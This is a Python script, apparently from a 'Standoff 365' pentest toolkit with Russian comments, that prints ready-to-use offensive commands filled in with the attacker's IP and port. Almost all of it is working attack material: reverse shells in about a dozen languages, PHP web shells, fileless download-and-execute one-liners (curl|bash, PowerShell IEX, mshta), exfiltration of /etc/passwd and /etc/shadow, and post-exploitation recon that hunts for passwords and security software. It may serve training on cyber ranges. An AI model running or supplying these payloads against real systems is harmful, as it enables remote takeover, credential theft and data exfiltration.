#!/usr/bin/env python3
"""
shell_upgrade.py — шпаргалка для апгрейда reverse shell до полноценного TTY
Standoff 365 Toolkit

Генерирует команды для:
- Получения reverse shell (bash/python/php/nc/powershell)
- Апгрейда до полноценного TTY
- Передачи файлов на жертву

Использование:
  python shell_upgrade.py                    # интерактивное меню
  python shell_upgrade.py revshell           # reverse shell команды
  python shell_upgrade.py upgrade            # TTY upgrade команды
  python shell_upgrade.py transfer           # передача файлов
  python shell_upgrade.py -i 10.0.0.1 -p 4444  # с заданным IP/портом
"""

import argparse
import os
import sys
from pathlib import Path

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.syntax import Syntax
    from rich.prompt import Prompt, IntPrompt
    HAS_RICH = True
except ImportError:
    HAS_RICH = False

console = Console() if HAS_RICH else None

# =============================================================================
# Утилиты
# =============================================================================

def header(title):
    if HAS_RICH:
        console.print(f"\n[bold magenta]{'═'*56}[/bold magenta]")
        console.print(f"[bold magenta]  {title}[/bold magenta]")
        console.print(f"[bold magenta]{'═'*56}[/bold magenta]\n")
    else:
        print(f"\n{'='*56}\n  {title}\n{'='*56}\n")

def show_cmd(description, cmd, lang="bash"):
    if HAS_RICH:
        console.print(f"[cyan]# {description}[/cyan]")
        console.print(
            Syntax(cmd, lang, theme="monokai", word_wrap=True,
                   background_color="default")
        )
        console.print()
    else:
        print(f"# {description}")
        print(f"  {cmd}\n")

def get_local_ip():
    """Определяем свой IP (tun0 → eth0 → fallback)."""
    try:
        import subprocess
        for iface in ["tun0", "tun1", "eth0", "ens33", "ens18", "enp0s3"]:
            r = subprocess.run(
                ["ip", "addr", "show", iface],
                capture_output=True, text=True
            )
            if r.returncode == 0:
                import re
                m = re.search(r'inet (\d+\.\d+\.\d+\.\d+)', r.stdout)
                if m:
                    return m.group(1)
    except Exception:
        pass
    return "ATTACKER_IP"

# =============================================================================
# 1. REVERSE SHELLS
# =============================================================================

def show_revshells(ip, port):
    header(f"Reverse Shell Commands → {ip}:{port}")

    shells = [
        # ── bash ──────────────────────────────────────────────────────────
        ("Bash TCP (стандартный)",
         f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
         "bash"),

        ("Bash TCP (вариант 2)",
         f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'",
         "bash"),

        ("Bash через /dev/tcp (exec)",
         f"exec bash -i &>/dev/tcp/{ip}/{port} <&1",
         "bash"),

        # ── python ────────────────────────────────────────────────────────
        ("Python3",
         f"python3 -c 'import socket,subprocess,os;"
         f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
         f"s.connect((\"{ip}\",{port}));"
         f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
         f"import pty;pty.spawn(\"/bin/bash\")'",
         "python"),

        ("Python2",
         f"python -c 'import socket,subprocess,os;"
         f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
         f"s.connect((\"{ip}\",{port}));"
         f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
         f"p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
         "python"),

        # ── php ───────────────────────────────────────────────────────────
        ("PHP",
         f"php -r '$sock=fsockopen(\"{ip}\",{port});"
         f"exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
         "php"),

        ("PHP (proc_open)",
         f"php -r '$s=fsockopen(\"{ip}\",{port});"
         f"$proc=proc_open(\"/bin/sh\",array(0=>$s,1=>$s,2=>$s),$pipes);'",
         "php"),

        # ── netcat ────────────────────────────────────────────────────────
        ("Netcat с -e",
         f"nc -e /bin/bash {ip} {port}",
         "bash"),

        ("Netcat без -e (mkfifo)",
         f"rm /tmp/f;mkfifo /tmp/f;"
         f"cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
         "bash"),

        ("Netcat без -e (нет mkfifo)",
         f"mknod /tmp/p p && nc {ip} {port} </tmp/p | /bin/bash 1>/tmp/p 2>&1",
         "bash"),

        # ── perl ──────────────────────────────────────────────────────────
        ("Perl",
         f"perl -e 'use Socket;"
         f"$i=\"{ip}\";$p={port};"
         f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
         f"connect(S,sockaddr_in($p,inet_aton($i)));"
         f"open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
         f"exec(\"/bin/sh -i\");'",
         "perl"),

        # ── ruby ──────────────────────────────────────────────────────────
        ("Ruby",
         f"ruby -rsocket -e 'f=TCPSocket.open(\"{ip}\",{port}).to_i;"
         f"exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
         "ruby"),

        # ── PowerShell (Windows) ──────────────────────────────────────────
        ("PowerShell (Windows)",
         f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
         f"\"$client=New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
         f"$stream=$client.GetStream();"
         f"[byte[]]$bytes=0..65535|%{{0}};"
         f"while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{"
         f"$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
         f"$sendback=(iex $data 2>&1|Out-String);"
         f"$sendback2=$sendback+'PS '+(pwd).Path+'> ';"
         f"$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);"
         f"$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};"
         f"$client.Close()\"",
         "powershell"),

        ("PowerShell Base64",
         f"powershell -e "
         f"JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0...",
         "powershell"),

        # ── Java ──────────────────────────────────────────────────────────
        ("Java",
         f"r=Runtime.getRuntime();"
         f"p=r.exec(new String[]{{\"/bin/bash\",\"-c\","
         f"\"exec 5<>/dev/tcp/{ip}/{port};cat <&5|while read line;"
         f"do $line 2>&5 >&5;done\"}});"
         f"p.waitFor();",
         "java"),

        # ── Golang ────────────────────────────────────────────────────────
        ("Golang",
         f"echo 'package main;import\"os/exec\";import\"net\";"
         f"func main(){{c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");"
         f"cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;"
         f"cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/sh.go "
         f"&& go run /tmp/sh.go",
         "bash"),

        # ── Socat ─────────────────────────────────────────────────────────
        ("Socat (обычный)",
         f"socat TCP:{ip}:{port} EXEC:/bin/bash",
         "bash"),

        ("Socat (с TTY)",
         f"socat TCP:{ip}:{port} EXEC:'bash -li',pty,stderr,setsid,sigint,sane",
         "bash"),

        # ── Web shells ─────────────────────────────────────────────────────
        ("PHP Web Shell (минимальный)",
         "<?php system($_GET['cmd']); ?>",
         "php"),

        ("PHP Web Shell (полный)",
         "<?php if(isset($_REQUEST['cmd'])){ "
         "echo '<pre>'; $cmd = ($_REQUEST['cmd']); "
         "system($cmd); echo '</pre>'; die; } ?>",
         "php"),
    ]

    if HAS_RICH:
        for desc, cmd, lang in shells:
            console.print(f"[bold cyan]▸ {desc}[/bold cyan]")
            console.print(
                Syntax(cmd, lang, theme="monokai",
                       background_color="default", word_wrap=True)
            )
            console.print()
    else:
        for desc, cmd, _ in shells:
            print(f"\n# {desc}")
            print(f"  {cmd}")

    if HAS_RICH:
        console.print(Panel(
            f"[bold]Слушатель на атакующей машине:[/bold]\n"
            f"[green]nc -lvnp {port}[/green]\n"
            f"[green]rlwrap nc -lvnp {port}[/green]  [dim](с историей команд)[/dim]",
            title="Не забудь запустить!",
            border_style="green"
        ))


# =============================================================================
# 2. TTY UPGRADE
# =============================================================================

def show_tty_upgrade():
    header("TTY Upgrade — превращаем dumb shell в полноценный TTY")

    if HAS_RICH:
        console.print(Panel(
            "[bold yellow]Зачем апгрейдить шелл?[/bold yellow]\n"
            "• Без TTY нет Tab completion, Ctrl+C убивает шелл, нет vim/nano\n"
            "• sudo, su, ssh требуют TTY\n"
            "• Многие программы не работают без TTY",
            border_style="yellow"
        ))
        console.print()

    # Метод 1: Python pty
    header("Метод 1: Python pty (самый распространённый)")
    steps_python = [
        ("Шаг 1 — Спауним bash через Python",
         "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
         "bash"),
        ("Шаг 1 (Python2)",
         "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
         "bash"),
        ("Шаг 2 — Переводим в background (на жертве)",
         "Ctrl+Z",
         "bash"),
        ("Шаг 3 — Настраиваем терминал (у нас)",
         "stty raw -echo; fg",
         "bash"),
        ("Шаг 4 — Восстанавливаем среду",
         "reset\nexport TERM=xterm\nexport SHELL=bash",
         "bash"),
        ("Шаг 5 — Устанавливаем размер терминала",
         "stty rows 50 columns 200\n"
         "# Или узнай свой размер: stty size (у себя)\n"
         "# И установи такой же на жертве",
         "bash"),
    ]
    for desc, cmd, lang in steps_python:
        show_cmd(desc, cmd, lang)

    # Метод 2: socat
    header("Метод 2: Socat (лучший — сразу полный TTY)")
    steps_socat = [
        ("На атакующей машине — слушатель",
         "socat file:`tty`,raw,echo=0 tcp-listen:4444",
         "bash"),
        ("На жертве — подключение",
         "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER:4444",
         "bash"),
        ("Если socat нет — скачиваем статический бинарник",
         "wget -q https://github.com/andrew-d/static-binaries/raw/master/"
         "binaries/linux/x86_64/socat -O /tmp/socat\n"
         "chmod +x /tmp/socat\n"
         "/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER:4444",
         "bash"),
    ]
    for desc, cmd, lang in steps_socat:
        show_cmd(desc, cmd, lang)

    # Метод 3: script
    header("Метод 3: script (если нет python/socat)")
    show_cmd("Используем встроенный script",
             "script -q /dev/null -c bash\n"
             "# Или:\n"
             "script /dev/null",
             "bash")

    # Метод 4: rlwrap
    header("Метод 4: rlwrap (только на атакующей стороне)")
    show_cmd("rlwrap добавляет историю команд и Ctrl+C",
             "rlwrap nc -lvnp 4444",
             "bash")

    # Метод 5: Windows
    header("Метод 5: Windows PowerShell апгрейд")
    steps_win = [
        ("PowerShell улучшенный шелл",
         "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);\n"
         "$stream = $client.GetStream();\n"
         "[byte[]]$bytes = 0..65535|%{0};\n"
         "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {\n"
         "  $data = (New-Object -TypeName System.Text.ASCIIEncoding)"
         ".GetString($bytes,0,$i);\n"
         "  $sendback = (iex $data 2>&1 | Out-String);\n"
         "  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';\n"
         "  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n"
         "  $stream.Write($sendbyte,0,$sendbyte.Length);\n"
         "  $stream.Flush();\n"
         "};\n"
         "$client.Close();",
         "powershell"),
        ("ConPTY Shell (Windows 10+ — полный PTY)",
         "# Используй: https://github.com/antonioCoco/ConPtyShell\n"
         "IEX(IWR https://raw.githubusercontent.com/"
         "antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing);\n"
         "Invoke-ConPtyShell ATTACKER 4444",
         "powershell"),
    ]
    for desc, cmd, lang in steps_win:
        show_cmd(desc, cmd, lang)

    # Быстрая шпаргалка
    if HAS_RICH:
        console.print(Panel(
            "[bold green]БЫСТРЫЙ РЕЦЕПТ (copy-paste):[/bold green]\n\n"
            "[cyan]# На жертве:[/cyan]\n"
            "[white]python3 -c 'import pty; pty.spawn(\"/bin/bash\")'[/white]\n"
            "[white]Ctrl+Z[/white]\n\n"
            "[cyan]# У нас:[/cyan]\n"
            "[white]stty raw -echo; fg[/white]\n"
            "[white]reset[/white]\n"
            "[white]export TERM=xterm SHELL=bash[/white]\n"
            "[white]stty rows 50 columns 200[/white]",
            title="Quick Reference",
            border_style="green"
        ))


# =============================================================================
# 3. ПЕРЕДАЧА ФАЙЛОВ
# =============================================================================

def show_file_transfer(ip, port):
    header(f"Передача файлов → {ip}:{port}")

    # Linux → получение файлов
    header("Linux — скачать файл с атакующей машины")

    dl_cmds = [
        ("Python HTTP сервер (у нас)",
         f"cd /path/to/files && python3 -m http.server {port}",
         "bash"),
        ("wget",
         f"wget http://{ip}:{port}/file.sh -O /tmp/file.sh",
         "bash"),
        ("curl",
         f"curl http://{ip}:{port}/file.sh -o /tmp/file.sh",
         "bash"),
        ("curl pipe exec (fileless)",
         f"curl http://{ip}:{port}/script.sh | bash",
         "bash"),
        ("bash TCP (если нет wget/curl)",
         f"exec 3<>/dev/tcp/{ip}/{port}\n"
         f"echo -e 'GET /file.sh HTTP/1.0\\r\\nHost: {ip}\\r\\n\\r\\n' >&3\n"
         f"cat <&3 > /tmp/file.sh",
         "bash"),
        ("nc получение файла",
         f"nc {ip} {port} > /tmp/file\n"
         f"# У нас: nc -lvnp {port} < /path/to/file",
         "bash"),
        ("SCP",
         f"scp user@{ip}:/path/to/file /tmp/file",
         "bash"),
    ]
    for desc, cmd, lang in dl_cmds:
        show_cmd(desc, cmd, lang)

    # Windows → получение файлов
    header("Windows — скачать файл")

    win_dl = [
        ("certutil (встроен в Windows)",
         f"certutil.exe -urlcache -f http://{ip}:{port}/file.exe C:\\Windows\\Temp\\file.exe",
         "powershell"),
        ("PowerShell WebClient",
         f"(New-Object System.Net.WebClient).DownloadFile("
         f"'http://{ip}:{port}/file.exe','C:\\Windows\\Temp\\file.exe')",
         "powershell"),
        ("PowerShell Invoke-WebRequest",
         f"Invoke-WebRequest -Uri 'http://{ip}:{port}/file.exe' "
         f"-OutFile 'C:\\Windows\\Temp\\file.exe'",
         "powershell"),
        ("PowerShell fileless (IEX)",
         f"IEX(New-Object Net.WebClient).downloadString("
         f"'http://{ip}:{port}/script.ps1')",
         "powershell"),
        ("bitsadmin",
         f"bitsadmin /transfer job /download /priority normal "
         f"http://{ip}:{port}/file.exe C:\\Windows\\Temp\\file.exe",
         "powershell"),
        ("mshta (HTA payload)",
         f"mshta http://{ip}:{port}/payload.hta",
         "powershell"),
    ]
    for desc, cmd, lang in win_dl:
        show_cmd(desc, cmd, lang)

    # SMB (универсально)
    header("SMB сервер (impacket) — Windows и Linux")

    smb_cmds = [
        ("Запуск SMB сервера (у нас)",
         "impacket-smbserver share /path/to/files -smb2support",
         "bash"),
        ("Копирование через SMB (Windows)",
         f"copy \\\\{ip}\\share\\file.exe C:\\Windows\\Temp\\file.exe\n"
         f"# Или:\n"
         f"\\\\{ip}\\share\\file.exe",
         "powershell"),
        ("Копирование через SMB (Linux)",
         f"smbclient \\\\\\\\{ip}\\\\share -N -c 'get file.sh'",
         "bash"),
    ]
    for desc, cmd, lang in smb_cmds:
        show_cmd(desc, cmd, lang)

    # Exfiltration
    header("Exfiltration — отправить файл с жертвы к нам")

    exfil_cmds = [
        ("nc exfiltration",
         f"# У нас:\nnc -lvnp {port} > loot.tar.gz\n\n"
         f"# На жертве:\ntar czf - /etc /home | nc {ip} {port}",
         "bash"),
        ("curl POST файла",
         f"curl -F 'file=@/etc/passwd' http://{ip}:{port}/upload",
         "bash"),
        ("base64 через curl (текстовый протокол)",
         f"base64 /etc/shadow | curl -d @- http://{ip}:{port}/",
         "bash"),
        ("Python HTTP upload",
         f"python3 -c \"\n"
         f"import urllib.request, base64\n"
         f"data = open('/etc/passwd','rb').read()\n"
         f"req = urllib.request.Request('http://{ip}:{port}/',"
         f"data=data, method='POST')\n"
         f"urllib.request.urlopen(req)\"",
         "python"),
    ]
    for desc, cmd, lang in exfil_cmds:
        show_cmd(desc, cmd, lang)

    # Приёмщик файлов у нас
    header("Приём файлов на атакующей машине")
    recv_cmds = [
        ("Python upload сервер",
         "# Сохрани как upload_server.py и запусти:\n"
         "python3 -c \"\n"
         "from http.server import HTTPServer, BaseHTTPRequestHandler\n"
         "class H(BaseHTTPRequestHandler):\n"
         "  def do_POST(self):\n"
         "    l=int(self.headers['Content-Length'])\n"
         "    d=self.rfile.read(l)\n"
         "    open('upload_'+str(id(d)),'wb').write(d)\n"
         "    self.send_response(200);self.end_headers()\n"
         "  def log_message(self,*a):pass\n"
         f"HTTPServer(('{ip}',{port}),H).serve_forever()\"",
         "python"),
        ("nc приём одного файла",
         f"nc -lvnp {port} > received_file",
         "bash"),
    ]
    for desc, cmd, lang in recv_cmds:
        show_cmd(desc, cmd, lang)


# =============================================================================
# 4. ПОЛЕЗНЫЕ КОМАНДЫ ПОСЛЕ ПОЛУЧЕНИЯ ШЕЛЛА
# =============================================================================

def show_post_shell():
    header("Первые команды после получения шелла")

    linux_enum = [
        ("Базовая информация",
         "id && whoami && hostname && uname -a\n"
         "cat /etc/os-release\n"
         "ip addr show && cat /etc/hosts",
         "bash"),
        ("Пользователи и группы",
         "cat /etc/passwd | grep -v nologin | grep -v false\n"
         "cat /etc/group\n"
         "w && last",
         "bash"),
        ("sudo права",
         "sudo -l 2>/dev/null",
         "bash"),
        ("SUID бинарники",
         "find / -perm -4000 -type f 2>/dev/null",
         "bash"),
        ("Cron задания",
         "cat /etc/crontab\n"
         "ls -la /etc/cron.*\n"
         "crontab -l 2>/dev/null",
         "bash"),
        ("Сеть",
         "ss -tulpn 2>/dev/null || netstat -tulpn\n"
         "ip route\n"
         "cat /etc/resolv.conf",
         "bash"),
        ("Поиск паролей",
         "find / -name '*.conf' -o -name '*.config' -o -name '.env' "
         "2>/dev/null | head -20\n"
         "grep -r 'password' /etc/ 2>/dev/null | grep -v '#'\n"
         "cat ~/.bash_history 2>/dev/null",
         "bash"),
        ("Запущенные процессы",
         "ps aux\n"
         "ps aux | grep -i 'root\\|mysql\\|postgres\\|redis'",
         "bash"),
    ]

    header("Linux — первичная разведка")
    for desc, cmd, lang in linux_enum:
        show_cmd(desc, cmd, lang)

    windows_enum = [
        ("Базовая информация",
         "whoami /all\n"
         "systeminfo\n"
         "hostname\n"
         "ipconfig /all",
         "powershell"),
        ("Пользователи",
         "net user\n"
         "net localgroup administrators\n"
         "net user /domain 2>nul",
         "powershell"),
        ("Поиск паролей в файлах",
         "findstr /si password *.xml *.ini *.txt *.config 2>nul\n"
         "dir /s *pass* *cred* *secret* 2>nul",
         "powershell"),
        ("Автозапуск и задачи",
         "schtasks /query /fo LIST /v\n"
         "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
         "powershell"),
        ("AV/EDR проверка",
         "tasklist /v | findstr /i "
         "\"defender crowdstrike sentinel carbon cylance sophos\"",
         "powershell"),
        ("Сеть",
         "netstat -ano\n"
         "route print\n"
         "arp -a",
         "powershell"),
    ]

    header("Windows — первичная разведка")
    for desc, cmd, lang in windows_enum:
        show_cmd(desc, cmd, lang)


# =============================================================================
# ИНТЕРАКТИВНОЕ МЕНЮ
# =============================================================================

def interactive_menu(ip, port):
    if HAS_RICH:
        console.print(Panel.fit(
            f"[bold cyan]shell_upgrade.py[/bold cyan]\n"
            f"[green]Атакующий IP:[/green]  {ip}\n"
            f"[green]Порт:[/green]          {port}",
            title="Standoff 365 Toolkit — Shell Utils",
            border_style="cyan"
        ))

    menu_items = [
        ("1", "Reverse Shell команды",      lambda: show_revshells(ip, port)),
        ("2", "TTY Upgrade (Linux)",        show_tty_upgrade),
        ("3", "Передача файлов",            lambda: show_file_transfer(ip, port)),
        ("4", "Первые команды после шелла", show_post_shell),
        ("5", "Всё сразу",                  lambda: (
            show_revshells(ip, port),
            show_tty_upgrade(),
            show_file_transfer(ip, port),
            show_post_shell()
        )),
        ("q", "Выход",                      None),
    ]

    while True:
        if HAS_RICH:
            console.print("\n[bold]Что показать?[/bold]")
            for key, title, _ in menu_items:
                console.print(f"  [{key}] {title}")
        else:
            print("\nЧто показать?")
            for key, title, _ in menu_items:
                print(f"  [{key}] {title}")

        try:
            choice = input("\n> ").strip().lower()
        except (KeyboardInterrupt, EOFError):
            break

        if choice == "q":
            break

        for key, _, func in menu_items:
            if choice == key and func:
                func()
                break
        else:
            print("Неверный выбор")


# =============================================================================
# MAIN
# =============================================================================

def parse_args():
    p = argparse.ArgumentParser(
        description="shell_upgrade.py — шпаргалка по шеллам и TTY апгрейду",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Примеры:
  python shell_upgrade.py                       # интерактивное меню
  python shell_upgrade.py revshell              # reverse shell команды
  python shell_upgrade.py upgrade               # TTY upgrade
  python shell_upgrade.py transfer              # передача файлов
  python shell_upgrade.py post                  # команды после шелла
  python shell_upgrade.py all                   # всё
  python shell_upgrade.py revshell -i 10.0.0.1 -p 9001
        """
    )
    p.add_argument("mode", nargs="?",
                   choices=["revshell", "upgrade", "transfer", "post", "all"],
                   help="Режим отображения")
    p.add_argument("-i", "--ip",   default="",    help="IP атакующей машины")
    p.add_argument("-p", "--port", type=int, default=4444, help="Порт (default: 4444)")
    return p.parse_args()


def main():
    args = parse_args()

    ip   = args.ip or get_local_ip()
    port = args.port

    if not args.mode:
        interactive_menu(ip, port)
        return

    if args.mode == "revshell":
        show_revshells(ip, port)
    elif args.mode == "upgrade":
        show_tty_upgrade()
    elif args.mode == "transfer":
        show_file_transfer(ip, port)
    elif args.mode == "post":
        show_post_shell()
    elif args.mode == "all":
        show_revshells(ip, port)
        show_tty_upgrade()
        show_file_transfer(ip, port)
        show_post_shell()


if __name__ == "__main__":
    main()